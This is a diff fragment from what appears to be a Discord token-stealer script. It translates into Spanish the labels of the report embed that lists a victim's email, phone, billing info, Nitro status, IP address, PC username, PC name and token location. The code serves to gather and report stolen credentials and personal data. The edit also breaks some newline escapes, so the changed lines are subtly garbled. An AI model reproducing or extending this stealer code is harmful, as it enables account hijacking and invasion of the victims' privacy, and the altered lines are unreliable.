@@ -119,13 +119,13 @@ def main():
                 "color": 0x7289da,
                 "fields": [
                     {
-                        "name": "**Account Info**",
-                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
+                        "name": "**Informacion de la Cuenta**",
+                        "value": f'Email: {email}\\Telefono: {phone}\\Nitro: {nitro}\\Billing Info: {billing}',
                         "inline": True
                     },
                     {
                         "name": "**PC Info**",
-                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
+                        "value": f'IP: {ip}\\nUsername: {pc_username}\\Nombre de la PC: {pc_name}\\Token Location: {platform}',
                         "inline": True
                     },
                     {
